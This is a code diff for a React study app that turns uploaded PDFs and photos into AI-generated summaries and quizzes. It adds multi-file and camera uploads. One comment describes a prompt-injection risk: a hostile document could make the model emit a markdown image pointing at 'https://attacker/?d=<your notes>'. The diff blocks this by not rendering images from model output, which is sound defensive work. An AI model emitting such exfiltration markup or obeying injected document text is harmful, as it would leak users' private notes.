@@ -1,6 +1,7 @@
 import React, { useEffect, useRef, useState } from "react";
 import {
   ArrowRight,
+  Camera,
   Check,
   Clock,
   FileText,
@@ -32,6 +33,7 @@ import {
 } from "firebase/auth";
 import ReactMarkdown from "react-markdown";
 import { auth, googleProvider } from "./firebase";
+import { MAX_UPLOAD_FILES, PICKER_ACCEPT, prepareUploadFiles, summarizeFileNames } from "./uploadPrep";
 
 // Gemini output often contains markdown (bold, bullet lists, etc.) — render
 // it instead of showing literal asterisks. react-markdown renders straight
@@ -51,6 +53,10 @@ const markdownComponents = {
       {children}
     </a>
   ),
+  // Never load images from model output: a prompt-injected document could
+  // make the model emit ![](https://attacker/?d=<your notes>), and the
+  // browser would fetch it — leaking data with zero clicks. Show alt text.
+  img: ({ alt }) => (alt ? <span>[image: {alt}]</span> : null),
 };
 
 function Markdown({ children }) {
@@ -60,9 +66,6 @@ function Markdown({ children }) {
 // In production the API is served by Vercel functions on the same origin;
 // in local dev the FastAPI server runs separately on port 8000.
 const API_BASE = import.meta.env.VITE_API_URL || (import.meta.env.DEV ? "http://localhost:8000" : "");
-
-// Vercel serverless functions reject bodies over ~4.5 MB.
-const MAX_UPLOAD_BYTES = 4 * 1024 * 1024;
 
 const MOCK = {
   title: "Chapter 6 — Memory & Learning",
@@ -593,10 +596,13 @@ export default function StudyMVP() {
     }
   };
 
-  const startUpload = async (file) => {
+  // files is a File[] — one or more PDFs/images picked from the web file
+  // dialog, dragged onto the dropzone, or chosen via a mobile browser's
+  // picker (camera roll, Files app, etc.). null means "sample mode."
+  const startUpload = async (files) => {
     setError("");
 
-    if (!file) {
+    if (!files || files.length === 0) {
       // Sample mode: show bundled demo content without hitting the backend.
       setFileName("psychology-ch6.pdf");
       setLoading(true);
@@ -609,19 +615,20 @@ export default function StudyMVP() {
       return;
     }
 
-    if (file.size > MAX_UPLOAD_BYTES) {
-      setError("PDF is too large. Maximum supported size is 4 MB.");
-      return;
-    }
-
-    setFileName(file.name);
+    setFileName(summarizeFileNames(files.map((f) => f.name)));
     setLoading(true);
     try {
+      // Validates type/count/size and shrinks large photos to JPEG first.
+      const prepared = await prepareUploadFiles(files);
       const form = new FormData();
-      form.append("file", file);
+      for (const f of prepared) form.append("files", f);
       const res = await authedFetch("/api/pdf/analyze", { method: "POST", body: form });
       const data = await res.json().catch(() => null);
       if (!res.ok) {
+        // Vercel's own body-size rejection has no JSON detail.
+        if (res.status === 413 && !data?.detail) {
+          throw new Error("These files are too large to upload together (4 MB limit). Try fewer files.");
+        }
         throw new Error(data?.detail || `The study service returned an error (${res.status}).`);
       }
       setDoc({
@@ -690,11 +697,16 @@ export default function StudyMVP() {
       <style>{css}</style>
       <a href="#main-content" className="skip-link">Skip to content</a>
       <header className="app-header" style={styles.header}>
-        <div style={styles.brand}>
+        <button
+          type="button"
+          style={styles.brandBtn}
+          onClick={() => setStage("upload")}
+          aria-label="Go to home"
+        >
           <SyroraMark size={32} />
           <span style={styles.brandName}>Syrora</span>
           <span className="brand-tagline" style={styles.brandTagline}>Knowledge that adapts to every mind.</span>
-        </div>
+        </button>
         <div style={styles.headerRight}>
           {trend && (
             <span
@@ -844,6 +856,15 @@ function HistoryPanel({ history, historyLoading, onOpenHistory, onDeleteHistory,
 
 function UploadScreen({ loading, onUpload, fileRef, error, history, historyLoading, onOpenHistory, onDeleteHistory, onClearHistory }) {
   const [drag, setDrag] = useState(false);
+  const cameraRef = useRef(null);
+  // Phones/tablets: no drag-and-drop, but a camera. `capture` is ignored on
+  // desktop, so the camera button is only shown where it does something.
+  const [isTouch] = useState(() => typeof window !== "undefined" && !!window.matchMedia?.("(pointer: coarse)").matches);
+  const pickFiles = (e) => {
+    const picked = Array.from(e.target.files || []);
+    if (picked.length) onUpload(picked);
+    e.target.value = "";
+  };
   const hasHistoryPanel = historyLoading || history.length > 0;
   const historyPanel = (
     <HistoryPanel
@@ -887,8 +908,8 @@ function UploadScreen({ loading, onUpload, fileRef, error, history, historyLoadi
         onDrop={(e) => {
           e.preventDefault();
           setDrag(false);
-          const f = e.dataTransfer.files?.[0];
-          if (f) onUpload(f);
+          const picked = Array.from(e.dataTransfer.files || []);
+          if (picked.length) onUpload(picked);
         }}
         onClick={() => !loading && fileRef.current?.click()}
         onKeyDown={(e) => {
@@ -900,36 +921,48 @@ function UploadScreen({ loading, onUpload, fileRef, error, history, historyLoadi
         }}
         role="button"
         tabIndex={0}
-        aria-label="Drop a PDF here or click to browse, max file size 4 MB"
+        aria-label={
+          isTouch
+            ? `Choose up to ${MAX_UPLOAD_FILES} PDFs or photos, 4 MB total`
+            : `Drop PDFs or photos here or click to browse, up to ${MAX_UPLOAD_FILES} files, 4 MB total`
+        }
       >
-        <input
-          ref={fileRef}
-          type="file"
-          accept=".pdf,application/pdf"
-          hidden
-          onChange={(e) => {
-            const f = e.target.files?.[0];
-            if (f) onUpload(f);
-            e.target.value = "";
-          }}
-        />
+        <input ref={fileRef} type="file" accept={PICKER_ACCEPT} multiple hidden onChange={pickFiles} />
         {loading ? (
           <div style={styles.loadingBox} role="status" aria-live="polite">
             <div className="spinner" aria-hidden="true" />
-            <p style={styles.loadingText}>Reading your document…</p>
-            <p style={styles.loadingSub}>Generating summary & quiz</p>
+            <p style={styles.loadingText}>Reading your files…</p>
+            <p style={styles.loadingSub}>Generating summary, quiz & flashcards</p>
           </div>
         ) : (
           <>
             <div style={styles.uploadIcon}>
               <Upload size={26} strokeWidth={2} />
             </div>
-            <p style={styles.dropTitle}>Drop a PDF here</p>
-            <p style={styles.dropSub}>or click to browse · PDF, slides, notes</p>
-            <p style={styles.dropLimit}>Max file size: 4 MB</p>
+            <p style={styles.dropTitle}>{isTouch ? "Tap to add PDFs or photos" : "Drop PDFs or photos here"}</p>
+            <p style={styles.dropSub}>
+              {isTouch ? "From your files or photo library" : "or click to browse · PDFs, slides, photos of notes"}
+            </p>
+            <p style={styles.dropLimit}>Up to {MAX_UPLOAD_FILES} files · 4 MB total · large photos are shrunk automatically</p>
           </>
         )}
       </div>
+
+      {isTouch && !loading && (
+        <>
+          <input
+            ref={cameraRef}
+            type="file"
+            accept="image/*"
+            capture="environment"
+            hidden
+            onChange={pickFiles}
+          />
+          <button type="button" style={styles.cameraBtn} onClick={() => cameraRef.current?.click()}>
+            <Camera size={16} /> Take a photo of your notes
+          </button>
+        </>
+      )}
 
       {!loading && error && <p style={styles.errorText} role="alert">{error}</p>}
 
@@ -2452,6 +2485,19 @@ const styles = {
     alignItems: "center",
   },
   brand: { display: "flex", alignItems: "center", gap: 10 },
+  brandBtn: {
+    display: "flex",
+    alignItems: "center",
+    gap: 10,
+    background: "none",
+    border: "none",
+    padding: 0,
+    margin: 0,
+    color: "inherit",
+    font: "inherit",
+    textAlign: "left",
+    cursor: "pointer",
+  },
   brandName: { fontWeight: 700, fontSize: 19, letterSpacing: "-0.02em", fontFamily: "'Fraunces', Georgia, serif" },
   brandTagline: {
     fontSize: 13,
@@ -2679,6 +2725,23 @@ const styles = {
   headerRight: { display: "flex", alignItems: "center", gap: 10 },
   usageBadge: { ...pillBadge },
   trendBadge: { ...pillBadge, alignItems: "center", gap: 5, fontWeight: 600 },
+  cameraBtn: {
+    marginTop: 16,
+    display: "inline-flex",
+    alignItems: "center",
+    justifyContent: "center",
+    gap: 8,
+    background: "#fff",
+    border: `1.5px solid ${moss}`,
+    color: mossDeep,
+    borderRadius: 12,
+    padding: "11px 20px",
+    minHeight: 44,
+    fontSize: 15,
+    fontWeight: 600,
+    cursor: "pointer",
+    fontFamily: "inherit",
+  },
   sampleBtn: {
     marginTop: 22,
     display: "inline-flex",
